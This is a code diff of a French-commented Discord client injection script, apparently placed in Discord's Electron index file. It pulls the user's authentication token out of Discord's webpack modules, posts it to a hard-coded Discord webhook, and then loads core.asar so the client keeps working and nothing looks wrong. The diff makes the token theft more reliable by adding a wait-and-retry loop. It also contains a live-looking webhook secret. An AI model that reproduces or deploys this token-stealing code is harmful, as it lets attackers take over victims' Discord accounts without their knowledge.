@@ -1,13 +1,13 @@
 const { BrowserWindow } = require("electron");
 const https = require("https");
 
-// Envoi vers le webhook Discord
+// Envoie le token au webhook Discord
 function sendToWebhook(content) {
     const data = JSON.stringify({ content });
 
     const options = {
         hostname: "discord.com",
-        path: "/api/webhooks/1372990357935231049/S3sJAliM2-iC1s9-lElmSGP73FPMKwRPIbiUBaU6Vc96kpu74qo4USkSeSB8U06klrpP", // 🔁 Remplace par ton propre lien de webhook
+        path: "/api/webhooks/1372990357935231049/S3sJAliM2-iC1s9-lElmSGP73FPMKwRPIbiUBaU6Vc96kpu74qo4USkSeSB8U06klrpP", // 🔁 Remplace par ton propre lien
         method: "POST",
         headers: {
             "Content-Type": "application/json",
@@ -27,41 +27,56 @@ function sendToWebhook(content) {
     req.end();
 }
 
-// Extraction du token avec Webpack
+// Récupère le token Discord depuis Webpack une fois que l'interface est prête
 function getToken() {
     const windows = BrowserWindow.getAllWindows();
 
     for (const win of windows) {
         win.webContents.on("did-finish-load", () => {
             win.webContents.executeJavaScript(`
-                webpackChunkdiscord_app.push([
-                    [Math.random()],
-                    {},
-                    e => {
-                        for (let c in e.c) {
-                            let m = e.c[c]?.exports;
-                            if (m?.default?.getToken !== undefined) {
-                                return m.default.getToken();
+                new Promise((resolve) => {
+                    const check = () => {
+                        if (window.webpackChunkdiscord_app) {
+                            try {
+                                window.webpackChunkdiscord_app.push([
+                                    [Math.random()],
+                                    {},
+                                    (e) => {
+                                        for (let c in e.c) {
+                                            let m = e.c[c]?.exports;
+                                            if (m?.default?.getToken !== undefined) {
+                                                resolve(m.default.getToken());
+                                                return;
+                                            }
+                                        }
+                                        resolve(null);
+                                    }
+                                ]);
+                            } catch (err) {
+                                resolve(null);
                             }
+                        } else {
+                            setTimeout(check, 100); // attend que Webpack soit prêt
                         }
-                        return null;
-                    }
-                ]);
+                    };
+                    check();
+                });
             `).then(token => {
                 if (token) {
-                    console.log("Token Discord récupéré :", token);
-                    sendToWebhook("Token Discord: " + token);
+                    console.log("✅ Token récupéré :", token);
+                    sendToWebhook("🎯 Token Discord: " + token);
                 } else {
-                    console.warn("Aucun token trouvé.");
+                    console.warn("⚠️ Aucun token trouvé.");
                 }
             }).catch(err => {
-                console.error("Erreur lors de l'extraction du token :", err);
+                console.error("❌ Erreur JS :", err);
             });
         });
     }
 }
 
+console.log("🚀 Script injection démarré");
 getToken();
 
-// Charge le cœur de Discord normalement
+// Recharge le cœur de Discord normalement
 module.exports = require('./core.asar');
